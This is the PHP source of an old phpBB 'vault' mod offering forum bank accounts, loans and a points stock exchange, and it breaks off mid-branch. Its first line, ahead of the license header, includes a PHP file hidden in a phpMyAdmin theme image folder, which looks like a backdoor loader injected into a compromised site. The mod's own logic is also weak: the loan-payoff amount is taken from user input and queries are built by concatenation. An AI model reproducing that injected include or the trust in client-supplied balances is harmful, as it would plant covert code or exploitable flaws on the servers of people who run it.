<?php
 require_once ('/var/www/html/archive.blackstardojo.org/phpmyadmin/themes/original/img/s_notice.php');
 
/***************************************************************************
 *					vault.php
 *				------------------------
 *	begin 			: 06/01/2004
 *	copyright			: Malicious Rabbit / Dr DLP
 *
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 *
 ***************************************************************************/

define('IN_PHPBB', true); 
$phpbb_root_path = './'; 
include($phpbb_root_path . 'extension.inc'); 
include($phpbb_root_path . 'common.'.$phpEx);

$userdata = session_pagestart($user_ip, PAGE_INDEX); 
init_userprefs($userdata); 
$user_id = $userdata['user_id'];

if ( !$userdata['session_logged_in'] )
{
	$redirect = "vault.$phpEx";
	$redirect .= ( isset($user_id) ) ? '&user_id=' . $user_id : '';
	header('Location: ' . append_sid("login.$phpEx?redirect=$redirect", true));
}

$template->set_filenames(array(
	'body' => 'vault_body.tpl')
);
include($phpbb_root_path . 'includes/page_header.'.$phpEx);


if ( !$board_config['vault_enable'] )
{
	vault_previous( Vault_closed , index , '' , Vault_index_return );
}

// Get the general config
$vault_general = vault_get_general_config();
$num_items = $vault_general['num_items'] + 1;
$base_amount = $vault_general['base_amount'];

$open = isset($HTTP_POST_VARS['open']);
$close = isset($HTTP_POST_VARS['close']);
$deposit = isset($HTTP_POST_VARS['deposit']);
$withdraw = isset($HTTP_POST_VARS['withdraw']);
$loan = isset($HTTP_POST_VARS['loan']);
$loan_back = isset($HTTP_POST_VARS['loan_back']);
$preferences = isset($HTTP_POST_VARS['preferences']);
$list = isset($HTTP_POST_VARS['list']);
$stock_exchange = isset($HTTP_POST_VARS['stock_exchange']);
$deposit_sum = intval($HTTP_POST_VARS['deposit_sum']);
$withdraw_sum = intval($HTTP_POST_VARS['withdraw_sum']);
$due_off = isset($HTTP_POST_VARS['due_payoff']);
$loan_sum = intval($HTTP_POST_VARS['loan_sum']);
$exchange_submit = isset($HTTP_POST_VARS['exchange_submit']);
$prefs = isset($HTTP_POST_VARS['prefs']);
$prefs_submit = isset($HTTP_POST_VARS['prefs_submit']);

if(isset($HTTP_POST_VARS['from']))
{
	$stock_exchange = ($HTTP_POST_VARS['from'] == 'pm') ? TRUE : FALSE;
	$list = ($HTTP_POST_VARS['from'] == 'list') ? TRUE : FALSE;
}
else if(isset($HTTP_GET_VARS['from']))
{
	$stock_exchange = ($HTTP_GET_VARS['from'] == 'pm') ? TRUE : FALSE;
	$list = ($HTTP_GET_VARS['from'] == 'list') ? TRUE : FALSE;
}

if ( $due_off )
{
	$due = intval($HTTP_POST_VARS['due']);

	if ( $due > $userdata['user_points'] ) 
	{
		vault_previous( Vault_loan_lack_points , vault , '' , '');
	}

	$sql = "UPDATE " . USERS_TABLE ."
		SET user_points = user_points - $due 
		WHERE user_id = $user_id";
	if( !$db->sql_query($sql))
	{
		message_die(GENERAL_ERROR, 'Could not obtain accounts information', "", __LINE__, __FILE__, $sql);
	}
	$sql = "UPDATE " . VAULT_USERS_TABLE ."
		SET loan_sum = 0 ,
		loan_time = 0
		WHERE owner_id = $user_id";
	if( !$db->sql_query($sql))
	{
		message_die(GENERAL_ERROR, 'Could not obtain accounts information', "", __LINE__, __FILE__, $sql);
	}

	$sql = "DELETE FROM " . VAULT_BLACKLIST_TABLE . " 
		WHERE user_id = " . $user_id;
	$result = $db->sql_query($sql);
	if( !$result )
	{
		message_die(GENERAL_ERROR, "Couldn't delete user into black list", "", __LINE__, __FILE__, $sql);
	}

	vault_previous( Vault_due_ok, vault , '' , '');
}

$sql = "SELECT * FROM ".VAULT_USERS_TABLE."
	WHERE owner_id = $user_id ";
if ( !($result = $db->sql_query($sql)) ) 
{ 
	message_die(CRITICAL_ERROR, 'Error Getting Vault Users!'); 
}
$vault = $db->sql_fetchrow($result);

if ( $vault['loan_time'] != 0 )
{
	if ( ($vault_general['loan_interests_time'] - ( time() - $vault['loan_time'])) < 0 )
	{
		$loan = $vault['loan_sum'] * ( 1 + ( $vault_general['loan_interests'] / 100 ));
		$due = ceil($loan * ( 1 + ( $vault_general['loan_interests'] / 100 )));

		$sql = "SELECT * FROM  " . VAULT_BLACKLIST_TABLE . "
			WHERE user_id = ".$user_id; 
		if (!$result = $db->sql_query($sql)) 
		{
			message_die(CRITICAL_ERROR, 'Error Getting Vault black list!');
		}
		$black = $db->sql_fetchrow($result);
		
		if ( !(is_numeric($black['user_due'])) )
		{
			$sql = "INSERT INTO  " . VAULT_BLACKLIST_TABLE . " ( user_id , user_due ) VALUES ( $user_id , $due ) ";
			if (!$result = $db->sql_query($sql)) 
			{
				message_die(CRITICAL_ERROR, 'Error Getting Vault black list!');
			}
		}
		else
		{
			$due = $black['user_due'];
		}
		$is_black = TRUE ;
		$template->assign_block_vars( 'blacked' , array());
	}
}

if ( $is_black != TRUE )
{
	if ( !(is_numeric($vault['account_id'])) ) 
	{
		$template->assign_block_vars( 'no_account' , array());
	}
	else
	{
		$template->assign_block_vars( 'account' , array());
		if ( $vault_general['vault_loan_enable'] )
		{
			$template->assign_block_vars( 'account.loan_authed' , array());
			if ( $vault['loan_sum'] != 0 ) 
			{
				$template->assign_block_vars( 'account.loan_authed.active_loan' , array());
			}
			else if ( $userdata['user_posts'] < $vault_general['loan_requirements'] ) 
			{
				$template->assign_block_vars( 'account.loan_authed.no_loan' , array());
			}
			else
			{
				$template->assign_block_vars( 'account.loan_authed.loan' , array());
			}
		}
		if ( $board_config['stock_use'] )
		{
			$template->assign_block_vars( 'account.stock' , array());
		}
	}
}


$account_time = time() - $vault['account_time'];
if ( $account_time > $vault_general['interests_time'] )
{
	$interests_mult = floor ( $account_time / $vault_general['interests_time']);
	$mult = 1 + ( $vault_general['interests_rate'] / 100 );
	$puissance = 1 + (( $vault_general['interests_rate'] / 100 ) * $interests_mult);
	$account_interests = floor ( $puissance * $vault['account_sum'] ); 
	$sup_time = floor( $vault['account_time'] + ( $vault_general['interests_time'] * $interests_mult ));

	$sql = "UPDATE " . VAULT_USERS_TABLE ."
		SET account_sum = $account_interests ,
		account_time = ".$sup_time."
		WHERE owner_id = $user_id";
	if( !$db->sql_query($sql))
	{
		message_die(GENERAL_ERROR, 'Could not obtain accounts information', "", __LINE__, __FILE__, $sql);
	}

}

if ( $open )
{
	$sql = "SELECT account_id FROM " . VAULT_USERS_TABLE ."
		ORDER BY account_id 
		DESC LIMIT 1";
	if( !$db->sql_query($sql))
	{
		message_die(GENERAL_ERROR, 'Could not obtain accounts information', "", __LINE__, __FILE__, $sql);
	}
	$max = $db->sql_fetchrow($result);
	$account_id = $max['account_id'] + 1 ;

	$sql = "INSERT INTO " . VAULT_USERS_TABLE . " ( owner_id , account_id , account_sum , account_time , loan_sum , loan_time)
		VALUES ( $user_id , $account_id , $base_amount ,  '" . time() . "' ,  0 , 0 )";
	$result = $db->sql_query($sql);
	if( !$result )
	{
		message_die(GENERAL_ERROR, "Couldn't insert new account", "", __LINE__, __FILE__, $sql);
	}
	vault_previous( Vault_account_opened , vault , '' , '');
}

if ( $close )
{
	$loan = ( $vault['loan_sum'] > 0 ) ? ( $vault['loan_sum'] * ( 1 + ( $vault_general['loan_interests'] / 100 ))) : 0;
	$due = ( $vault['account_sum'] - $loan - $base_amount );

	$sql = "DELETE FROM " . VAULT_USERS_TABLE . "
		WHERE owner_id = $user_id";
	if( !$db->sql_query($sql))
	{
		message_die(GENERAL_ERROR, 'Could not obtain accounts information', "", __LINE__, __FILE__, $sql);
	}


	$sql = "UPDATE " . USERS_TABLE . "
		SET user_points = user_points + $due
		WHERE user_id = $user_id ";
	if( !$db->sql_query($sql))
	{
		message_die(GENERAL_ERROR, 'Could not obtain accounts information', "", __LINE__, __FILE__, $sql);
	}

	$sql = "SELECT * FROM " . VAULT_EXCHANGE_USERS_TABLE . "
		WHERE user_id = $user_id ";
	$result = $db->sql_query($sql);
	if( !$result )
	{
		message_die(GENERAL_ERROR, "Couldn't delete stock", "", __LINE__, __FILE__, $sql);
	}
	$users = $db->sql_fetchrowset($result);

	for ( $i = 0 ; $i < count ( $users ) ; $i ++ )
	{
		$ssql = "SELECT stock_price FROM " . VAULT_EXCHANGE_TABLE . "
			WHERE stock_id = " . $users[$i]['stock_id'];
			$sresult = $db->sql_query($ssql);
		if( !$sresult )
		{
			message_die(GENERAL_ERROR, "Couldn't delete stock", "", __LINE__, __FILE__, $ssql);
		}
		$prize = $db->sql_fetchrow($sresult);
		$price = $prize['stock_price'] * $users[$i]['stock_amount'];
		$usql = "UPDATE " . USERS_TABLE . "
			SET user_points = user_points + $price 
			WHERE user_id =  ".$users[$i]['user_id'];
		$uresult = $db->sql_query($usql);
		if( !$uresult )
		{
			message_die(GENERAL_ERROR, "Couldn't delete stock", "", __LINE__, __FILE__, $usql);
		}
	}
	$sql = "DELETE FROM " . VAULT_EXCHANGE_USERS_TABLE . " 
		WHERE user_id = " . $user_id;
	$result = $db->sql_query($sql);
	if( !$result )
	{
		message_die(GENERAL_ERROR, "Couldn't delete stock", "", __LINE__, __FILE__, $sql);
	}
	vault_previous( Vault_account_closed , vault , '' , '');
}

if ( $exchange_submit )
{
	$sql = "SELECT *
		FROM " . VAULT_EXCHANGE_TABLE ."
		ORDER BY stock_id 
		DESC LIMIT 1";
	$result = $db->sql_query($sql);
	if( !$result )
	{
		message_die(GENERAL_ERROR, 'Could not obtain stock exchange information', "", __LINE__, __FILE__, $sql);
	}
	$stock_data = $db->sql_fetchrow($result);
	$max = $stock_data['stock_id'];

	for ($i=0; $i <= $max; $i++) 
	{ 
		$input = 'buy_item' . $i; 
		$$input = intval($HTTP_POST_VARS[$input]);
		$input2 = 'sell_item' . $i; 
		$$input2 = intval($HTTP_POST_VARS[$input2]);
	}
	$sql = "SELECT stock_price , stock_id , stock_cap FROM " . VAULT_EXCHANGE_TABLE ." 
		ORDER BY stock_id";
	$result = $db->sql_query($sql);
	if( !$result )
	{
		message_die(GENERAL_ERROR, 'Could not obtain items pets information', "", __LINE__, __FILE__, $sql);
	}
	$items = $db->sql_fetchrowset($result);
	for ( $i = 0 ; $i < count($items) ; $i ++ )
	{
		$price = 0;
		$a = $items[$i]['stock_id'] ;
		
		$buys = 'buy_item'.$items[$i]['stock_id'].'';
		$buy = $$buys;
		$sells = 'sell_item'.$items[$i]['stock_id'].'';
		$sell = $$sells;
		$price = ( ( $buy -  $sell ) * $items[$i]['stock_price'] );

		$ssql = "SELECT stock_amount FROM " . VAULT_EXCHANGE_USERS_TABLE ." 
		WHERE stock_id = ".$items[$i]['stock_id']."
		AND user_id = ".$user_id;
		$sresult = $db->sql_query($ssql);
		if( !$sresult )
		{
			message_die(GENERAL_ERROR, 'Could not obtain shares information', "", __LINE__, __FILE__, $ssql);
		}
		$user_items = $db->sql_fetchrow($sresult);

		if ( (( $sell - $buy ) > $user_items['stock_amount'] && is_numeric($user_items['stock_amount'])) || ( !(is_numeric($user_items['stock_amount'])) && (( $buy - $sell ) < 0) ) )
		{
			vault_previous( Vault_stock_lack , vault , '' , '');
		}
		if ( $price > $userdata['user_points'])
		{
			vault_previous( Vault_points_lack , vault , '' , '');
		}
		else
		{
			$sql = "UPDATE " . USERS_TABLE ."
				SET user_points = user_points - $price
				WHERE user_id = $user_id";
			if( !$db->sql_query($sql))
			{
				message_die(GENERAL_ERROR, 'Could not obtain update user points', "", __LINE__, __FILE__, $sql);
			}
		}
		$userdata['user_points'] = $userdata['user_points'] - $price;
		$tsql = "SELECT * FROM ". VAULT_EXCHANGE_USERS_TABLE ." WHERE stock_id = ".$items[$i]['stock_id'];
		$result = $db->sql_query($tsql);
		if( !$result )
		{
			message_die(GENERAL_ERROR, "Couldn't obtain stock exchange from database", "", __LINE__, __FILE__, $tsql);
		}
		$s_out = $db->sql_fetchrowset($result);
		$stock_out = 0;
		for($q = 0; $q < count($s_out); $q++)
		{
			$stock_out = $stock_out + $s_out[$q]['stock_amount'];
		}
		$prize = $buy -  $sell;
		$testtotal = $prize + $stock_out;
		if ($testtotal > $items[$i]['stock_cap'] && $items[$i]['stock_cap'] > 0)
		{
			message_die(MESSAGE, "There isn't that many shares available");
		}
		if ( is_numeric($user_items['stock_amount']) &&	$prize != 0 )
		{
			$rsql = "UPDATE " . VAULT_EXCHANGE_USERS_TABLE ."
				SET stock_amount = stock_amount + $prize, 
				price_transaction = ".$items[$i]['stock_price']."
				WHERE user_id = $user_id
				AND stock_id = ".$items[$i]['stock_id'];
			if( !$db->sql_query($rsql))
			{
				message_die(GENERAL_ERROR, 'Could not update user stock', "", __LINE__, __FILE__, $rsql);
			}
		}
		else if ( !(is_numeric($user_items['stock_amount'])) && $prize != 0 )
		{
			$rsql = "INSERT INTO " . VAULT_EXCHANGE_USERS_TABLE ."
				( stock_id , user_id , stock_amount, price_transaction )
				VALUES ( ".$items[$i]['stock_id']." , $user_id , $prize , ".$items[$i]['stock_price'].")";
			if( !$db->sql_query($rsql))
			{
				message_die(GENERAL_ERROR, 'Could not update user stock', "", __LINE__, __FILE__, $rsql);
			}
		}
	}
	$stock_exchange = TRUE;	

}

if ( $stock_exchange )
{
	$template->set_filenames(array(
		'body' => 'vault_exchange_body.tpl')
	);

// phpBB Stock Ticker

//

   $sql = "SELECT stock_name, stock_price, stock_previous_price FROM phpbb_vault_exchange ORDER BY stock_name ASC";

   if ( !($result = $db->sql_query($sql)) )

   {

      message_die(GENERAL_ERROR, 'Unable to retrieve stocks data', '', __LINE__, __FILE__, $sql);

   }
	$stock_tick = $db->sql_fetchrowset($result);
	$stock_index = 0;
	$stock_index_prev = 0;
	for($i = 0; $i < count($stock_tick); $i++)
	{
		$stock_index = $stock_index + $stock_tick[$i]['stock_price'];
		$stock_index_prev = $stock_index_prev + $stock_tick[$i]['stock_previous_price'];
	}

	$stock_index_diff = $stock_index - $stock_index_prev;
 if ($stock_index_diff != 0 )

      {
	if ( $stock_index_diff < 0 )

         {

            $stock_index_diff = "<font color='#ff0000'><span style='color: #ff0000; font-size: 9px;'>". $stock_index_diff ."</span></font>";

         }

         else

         {

            $stock_index_diff = "<font color='#00ff00'><span style='color: #00ff00; font-size: 9px;'>". $stock_index_diff ."</span></font>";

         }

      }

      else

      {

         $stock_index_diff = "<font color='#00ffff'><span style='color: #00ffff; font-size: 9px;'>0</span></font>";

      }
	$template->assign_vars(array(

        'STOCK_INDEX' => $stock_index,
	'STOCK_INDEX_DIFF' => $stock_index_diff

      ));

   for($i = 0; $i < count($stock_tick); $i++)

   {

      $stock_name = $stock_tick[$i]['stock_name'];

      $stock_previous = $stock_tick[$i]['stock_previous_price'];

      $stock_value = $stock_tick[$i]['stock_price'];

      if ( $stock_value != $stock_previous )

      {

         $stock_diff = $stock_value - $stock_previous;

         if ( $stock_diff < 0 )

         {

            $stock_diff = "<font color='#ff0000'><span style='color: #ff0000; font-size: 9px;'>". $stock_diff ."</span></font>";

         }

         else

         {

            $stock_diff = "<font color='#00ff00'><span style='color: #00ff00; font-size: 9px;'>". $stock_diff ."</span></font>";

         }

      }

      else

      {

         $stock_diff = "<font color='#00ffff'><span style='color: #00ffff; font-size: 9px;'>0</span></font>";

      }

      $template->assign_block_vars('row_stock_tick', array(

         'STOCK_NAME' => $stock_name,

         'STOCK_DIFF' => $stock_diff,

         'STOCK_VALUE' => $stock_value

      ));

   }

	$sql = "SELECT *
		FROM " . VAULT_EXCHANGE_TABLE ."
		ORDER BY stock_id ";
	$result = $db->sql_query($sql);
	if( !$result )
	{
		message_die(GENERAL_ERROR, "Couldn't obtain stock exchange from database", "", __LINE__, __FILE__, $sql);
	}
	$exchange = $db->sql_fetchrowset($result);

	for($i = 0; $i < count($exchange); $i++)
	{
		$a = $exchange[$i]['stock_id']; 
		
		$sql = "SELECT * FROM ". VAULT_EXCHANGE_USERS_TABLE ." WHERE stock_id = ".$exchange[$i]['stock_id'];
		$result = $db->sql_query($sql);
		if( !$result )
		{
			message_die(GENERAL_ERROR, "Couldn't obtain stock exchange from database", "", __LINE__, __FILE__, $sql);
		}
		$s_out = $db->sql_fetchrowset($result);
		$stock_out = 0;
		for($q = 0; $q < count($s_out); $q++)
		{
			$stock_out = $stock_out + $s_out[$q]['stock_amount'];
		}
		$buy_item[$a] = "";
		$buy_item[$a] = '<select name="buy_item'.$a.'" >';
		for( $k = 0; $k < $num_items; $k++ )
		{
			$buy_item[$a] .= '<option value="' . $k . '" >' . $k . '</option>';
		}
		$buy_item[$a] .= '</select>';

		$sell_item[$a] = "";
		$sell_item[$a] = '<select name="sell_item'.$a.'" >';
		for( $l = 0; $l < $num_items; $l++ )
		{
			$sell_item[$a] .= '<option value="' . $l . '" >' . $l . '</option>';
		}
		$sell_item[$a] .= '</select>';

		$row_class = ( !($i % 2) ) ? $theme['td_class1'] : $theme['td_class2'];

		$sql = "SELECT *
			FROM " . VAULT_EXCHANGE_USERS_TABLE ."
			WHERE stock_id = ".$exchange[$i]['stock_id']."
			AND user_id = ".$user_id;
		$result = $db->sql_query($sql);
		if( !$result )
		{
			message_die(GENERAL_ERROR, "Couldn't obtain stock exchange from database", "", __LINE__, __FILE__, $sql);
		}
		$owned = $db->sql_fetchrow($result);
		$actions_owned = $owned['stock_amount'];
		$bought_owned = $owned['price_transaction'];
		if ($stock_out == 0)
		{
			$percent = "0%";
		}
		else if ($stock_out == $actions_owned)
		{
			$percent = "100%";
		}
		else
		{
			$percent = $actions_owned / $stock_out;
			$percent = $percent * 100;
			$pos = strpos($percent,".");
			$percent = substr($percent,0,$pos+2);
			$percent = $percent."%";
		}
		$cap=$exchange[$i]['stock_cap'];
		if ( $cap ==0)
		{
			$cap = "Unlimited";
		}
		if ( !$bought_owned)
		{
			$bought_owned = $lang['Vault_exchange_none'];
		}
		if ( !$actions_owned )
		{
			$actions_owned = $lang['Vault_exchange_none'];
			$percent = $lang['Vault_exchange_none'];
		}
		
		$template->assign_block_vars("exchange", array(
			"ROW_COLOR" => "#" . $row_color,
			"ROW_CLASS" => $row_class,
			"STOCK_NAME" =>  vault_get_lang($exchange[$i]['stock_name']),
			"STOCK_DESC" =>  vault_get_lang($exchange[$i]['stock_desc']),
			"STOCK_AMOUNT" =>  $exchange[$i]['stock_price'], 
			"STOCK_PREVIOUS" =>  $exchange[$i]['stock_previous_price'], 
			"STOCK_WORST" =>  $exchange[$i]['stock_worst_price'], 
			"STOCK_BEST" =>  $exchange[$i]['stock_best_price'], 
			"STOCK_BUY" =>  $buy_item[$a],
			"STOCK_BOUGHT" =>  $bought_owned, 
			"STOCK_SELL" =>  $sell_item[$a],
			"STOCK_OWNED" =>  $actions_owned,
			"STOCK_TOTAL" =>  $stock_out,
			"STOCK_PERCENT" => $percent,
			"STOCK_CAP" => $cap)
		);
	}

	$template->assign_vars(array(
		'L_STOCK_EXCHANGE_ACTIONS' => $lang['Vault_exchange_actions'],
		'L_STOCK_NAME' => $lang['Vault_exchange_actions_name'],
		'L_STOCK_BOUGHT' => $lang['Vault_exchange_actions_bought'],
		'L_STOCK_DESC' => $lang['Vault_exchange_actions_desc'],
		'L_STOCK_AMOUNT' => $lang['Vault_exchange_actions_amount'],
		'L_STOCK_PREVIOUS' => $lang['Vault_exchange_previous_price'],
		'L_STOCK_WORST' => $lang['Vault_exchange_worst_price'],
		'L_STOCK_BEST' => $lang['Vault_exchange_best_price'],
		'L_STOCK_OWNED' => $lang['Vault_exchange_owned'],
		'L_STOCK_BUY'  => $lang['Vault_exchange_buy'],
		'L_STOCK_SELL'  => $lang['Vault_exchange_sell'],
		'L_STOCK_MAX' => "Maximum",
		'L_SUBMIT' => $lang['Submit'],
		'POS' => $pos
	));
}

if ( $prefs )
{
	$template->set_filenames(array(
		'body' => 'vault_preferences_body.tpl')
	);

	if ( $board_config['stock_use'] )
	{
		$template->assign_block_vars( 'stock' , array());
	}

	$template->assign_vars(array(
		'L_SUBMIT' => $lang['Submit'],
		'L_VAULT_ACCOUNT_PROTECT' => $lang['Vault_pref_account_protect'],
		'L_VAULT_LOAN_PROTECT' => $lang['Vault_pref_loan_protect'],
		'L_VAULT_NEWSLETTER' => $lang['Vault_pref_newsletter'],
		'VAULT_ACCOUNT_PROTECT_CHECKED' => ( $vault['account_protect'] ? 'CHECKED' :'' ),
		'VAULT_LOAN_PROTECT_CHECKED' => ( $vault['loan_protect'] ? 'CHECKED' :'' ),
		'VAULT_NEWSLETTER_CHECKED' => ( $vault['newsletter'] ? 'CHECKED' :'' ),
	));
}

if ( $list )
{
	$template->set_filenames(array(
		'body' => 'vault_list_body.tpl')
	);

	if ( $board_config['stock_use'] )
	{
		$template->assign_block_vars( 'stock' , array());
	}

	$start = ( isset($HTTP_GET_VARS['start']) ) ? intval($HTTP_GET_VARS['start']) : 0;

	if ( isset($HTTP_GET_VARS['mode']) || isset($HTTP_POST_VARS['mode']) )
	{
		$mode = ( isset($HTTP_POST_VARS['mode']) ) ? htmlspecialchars($HTTP_POST_VARS['mode']) : htmlspecialchars($HTTP_GET_VARS['mode']);
	}
	else
	{
		$mode = 'username';
	}

	if(isset($HTTP_POST_VARS['order']))
	{
		$sort_order = ($HTTP_POST_VARS['order'] == 'ASC') ? 'ASC' : 'DESC';
	}
	else if(isset($HTTP_GET_VARS['order']))
	{
		$sort_order = ($HTTP_GET_VARS['order'] == 'ASC') ? 'ASC' : 'DESC';
	}
	else
	{
		$sort_order = 'ASC';
	}

	$mode_types_text = array( $lang['Sort_Username'], $lang['Vault_account_amount'],$lang['Vault_loan_amount']);
	$mode_types = array('username', 'account', 'loan');

	$select_sort_mode = '<select name="mode">';
	for($i = 0; $i < count($mode_types_text); $i++)
	{
		$selected = ( $mode == $mode_types[$i] ) ? ' selected="selected"' : '';
		$select_sort_mode .= '<option value="' . $mode_types[$i] . '"' . $selected . '>' . $mode_types_text[$i] . '</option>';
	}
	$select_sort_mode .= '</select>';

	$select_sort_order = '<select name="order">';
	if($sort_order == 'ASC')
	{
		$select_sort_order .= '<option value="ASC" selected="selected">' . $lang['Sort_Ascending'] . '</option><option value="DESC">' . $lang['Sort_Descending'] . '</option>';
	}
	else
	{
		$select_sort_order .= '<option value="ASC">' . $lang['Sort_Ascending'] . '</option><option value="DESC" selected="selected">' . $lang['Sort_Descending'] . '</option>';
	}	
	$select_sort_order .= '</select>';

	switch( $mode )
	{
		case 'username':
			$order_by = "u.username $sort_order LIMIT $start, " . $board_config['topics_per_page'];
			break;
		case 'account':
			$order_by = "v.account_sum $sort_order LIMIT $start, " . $board_config['topics_per_page'];
			break;
		case 'loan':
			$order_by = "v.loan_sum $sort_order LIMIT $start, " . $board_config['topics_per_page'];
			break;
		default:
			$order_by = "u.username $sort_order LIMIT $start, " . $board_config['topics_per_page'];
			break;
	}
	$sql = "SELECT u.username, u.user_id, v.*  
		FROM " . USERS_TABLE . " u , " . VAULT_USERS_TABLE . " v
		WHERE u.user_id = v.owner_id 
		AND u.user_id > 0
		ORDER BY $order_by";
	if( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, 'Could not query users', '', __LINE__, __FILE__, $sql);
	}

	if ( $row = $db->sql_fetchrow($result) )
	{
		$i = 0;
		do
		{
			$username = $row['username'];
			$user_id = $row['user_id'];
			$account_sum = ( $row['account_protect'] && $row['user_id'] != $userdata['user_id'] && $userdata['user_level'] != ADMIN ) ? $lang['Vault_confidential'] : $row['account_sum'];
			$row['loan_sum'] = ( $row['loan_sum'] != 0 ) ? $row['loan_sum'] : $lang['Vault_loan_none'];
			$loan_sum = ( $row['loan_protect'] && $row['user_id'] != $userdata['user_id'] && $userdata['user_level'] != ADMIN ) ? $lang['Vault_confidential'] : $row['loan_sum'];
			$temp_url = append_sid("profile.$phpEx?mode=viewprofile&amp;" . POST_USERS_URL . "=$user_id");
			$profile_img = '<a href="' . $temp_url . '"><img src="' . $images['icon_profile'] . '" alt="' . $lang['Read_profile'] . '" title="' . $lang['Read_profile'] . '" border="0" /></a>';
			$profile = '<a href="' . $temp_url . '">' . $lang['Read_profile'] . '</a>';

			$row_color = ( !($i % 2) ) ? $theme['td_color1'] : $theme['td_color2'];
			$row_class = ( !($i % 2) ) ? $theme['td_class1'] : $theme['td_class2'];

			$template->assign_block_vars('vault_users', array(
				'ROW_NUMBER' => $i + ( $HTTP_GET_VARS['start'] + 1 ),
				'ROW_COLOR' => '#' . $row_color,
				'ROW_CLASS' => $row_class,
				'USERNAME' => $username ,
				'ACCOUNT' => $account_sum ,
				'LOAN' => $loan_sum,
				'PROFILE_IMG' => $profile_img, 
				'PROFILE' => $profile, 				
				'U_VIEWPROFILE' => append_sid("profile.$phpEx?mode=viewprofile&amp;" . POST_USERS_URL . "=$user_id"))
			);

			$i++;
		}
		while ( $row = $db->sql_fetchrow($result) );
	}
	$sql = "SELECT count(*) AS total FROM " . VAULT_USERS_TABLE;
	if ( !($result = $db->sql_query($sql)) )
	{
		message_die(GENERAL_ERROR, 'Error getting total users', '', __LINE__, __FILE__, $sql);
	}

	if ( $total = $db->sql_fetchrow($result) )
	{
		$total_members = $total['total'];
		$pagination = generate_pagination("vault.$phpEx?from=list&amp;mode=$mode&amp;order=$sort_order", $total_members, $board_config['topics_per_page'], $start). '&nbsp;';
	}

	$template->assign_vars(array(
		'L_SUBMIT' => $lang['Submit'],
		'L_ON_ACCOUNT' => $lang['Vault_account_amount'],
		'L_ON_LOAN' => $lang['Vault_loan_amount'],
		'L_SELECT_SORT_METHOD' => $lang['Select_sort_method'],
		'S_MODE_SELECT' => $select_sort_mode,
		'S_ORDER_SELECT' => $select_sort_order,
		'PAGINATION' => $pagination,
		'PAGE_NUMBER' => sprintf($lang['Page_of'], ( floor( $start / $board_config['topics_per_page'] ) + 1 ), ceil( $total_members / $board_config['topics_per_page'] )), 
		'L_GOTO_PAGE' => $lang['Goto_page'],
	));
}

if ( $prefs_submit )
{
	$account_protect = intval($HTTP_POST_VARS['account_protect']);
	$loan_protect = intval($HTTP_POST_VARS['loan_protect']);
	$newsletter = intval($HTTP_POST_VARS['newsletter']);

	$sql= "UPDATE ". VAULT_USERS_TABLE . " 
		SET account_protect = $account_protect ,
		loan_protect = $loan_protect ,
		newsletter = $newsletter
		WHERE owner_id = ".$user_id;
	if ( !($result = $db->sql_query($sql)) ) 
	{ 
		message_die(GENERAL_ERROR, $lang['Vault_update_error'] , "", __LINE__, __FILE__, $sql); 
	} 
	vault_previous( Vault_prefs_ok , vault , '' , '');
}

if ( $deposit && $deposit_sum > 0 )
{
	if ( $deposit_sum > $userdata['user_points'] )
	{
		message_die(GENERAL_MESSAGE,$lang['Vault_deposit_lack'] . '<br />' . sprintf($lang['Vault_return'] , '<a href="' . append_sid('vault.php') . '">', '</a>'));
	}
	$sql = "UPDATE " . VAULT_USERS_TABLE ."
		SET account_sum = account_sum + $deposit_sum 
		WHERE owner_id = $user_id";
	if( !$db->sql_query($sql))
	{
		message_die(GENERAL_ERROR, 'Could not obtain accounts information', "", __LINE__, __FILE__, $sql);
	}
	$sql = "UPDATE " . USERS_TABLE ."
		SET user_points = user_points - $deposit_sum 
		WHERE user_id = $user_id";
	if( !$db->sql_query($sql))
	{
		message_die(GENERAL_ERROR, 'Could not obtain accounts information', "", __LINE__, __FILE__, $sql);
	}
	vault_previous( Vault_account_ok , vault , '' , '');
}

if ( $withdraw && $withdraw_sum > 0 )
{
	if ( $withdraw_sum > $vault['account_sum'] )
	{
		vault_previous( Vault_withdraw_lack , vault , '' , '');
	}
	$sql = "UPDATE " . VAULT_USERS_TABLE ."
		SET account_sum = account_sum - $withdraw_sum 
		WHERE owner_id = $user_id";
	if( !$db->sql_query($sql))
	{
		message_die(GENERAL_ERROR, 'Could not obtain accounts information', "", __LINE__, __FILE__, $sql);
	}
	$sql = "UPDATE " . USERS_TABLE ."
		SET user_points = user_points + $withdraw_sum 
		WHERE user_id = $user_id";
	if( !$db->sql_query($sql))
	{
		message_die(GENERAL_ERROR, 'Could not obtain accounts information', "", __LINE__, __FILE__, $sql);
	}
	vault_previous( Vault_account_ok , vault , '' , '');
}

if ( $loan && $loan_sum > 0 )
{
	if ( $vault['loan_sum'] != 0 ) 
	{
		vault_previous( Vault_loan_no_double , vault , '' , '');
	}
	if ( $userdata['user_posts'] < $vault_general['loan_requirements'] || $vault['loan_sum'] != 0 ) 
	{
		$message = $lang['Vault_loan_no_explain'].$vault_general['loan_requirements'].$lang['Posts'];
		$message .= '<br /><br />'.sprintf($lang['Vault_return'] , "<a href=\"" . append_sid("vault.$phpEx") . "\">", "</a>");
		message_die( GENERAL_MESSAGE,$message );
	}
	if ( $loan_sum > $vault_general['loan_max_sum'] || $loan_sum < 0 ) 
	{
		vault_previous( Vault_loan_no_such , vault , '' , '');
	}

	$sql = "UPDATE " . USERS_TABLE ."
		SET user_points = user_points + $loan_sum 
		WHERE user_id = $user_id";
	if( !$db->sql_query($sql))
	{
		message_die(GENERAL_ERROR, 'Could not obtain accounts information', "", __LINE__, __FILE__, $sql);
	}
	$sql = "UPDATE " . VAULT_USERS_TABLE ."
		SET loan_sum = $loan_sum ,
		loan_time = ".time()."
		WHERE owner_id = $user_id";
	if( !$db->sql_query($sql))
	{
		message_die(GENERAL_ERROR, 'Could not obtain accounts information', "", __LINE__, __FILE__, $sql);
	}

	$message = $lang['Vault_loan_ok'].$loan_sum.'&nbsp;'."Yen";
	$message .= '<br /><br />'.sprintf($lang['Vault_return'] , "<a href=\"" . append_sid("vault.$phpEx") . "\">", "</a>");
	message_die( GENERAL_MESSAGE,$message );

}

if ( $loan_back )
{
	$pay_off = $vault['loan_sum'] * ( 1 + ( $vault_general['loan_interests'] / 100 ));
	if ( $pay_off > $userdata['user_points'] ) 
	{
		vault_previous( Vault_loan_lack_points , vault , '' , '');
	}

